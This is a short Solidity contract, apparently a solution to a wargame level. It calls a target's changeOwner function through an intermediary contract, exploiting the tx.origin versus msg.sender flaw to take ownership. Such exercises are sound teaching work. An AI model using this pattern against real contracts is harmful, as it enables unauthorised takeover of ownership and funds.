// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public telephoneContract;

    constructor(address _instance) public {
        telephoneContract = ITelephone(_instance);
    }

    function callChangeOwner(address _newOwner) external {
        telephoneContract.changeOwner(_newOwner);
    }
}

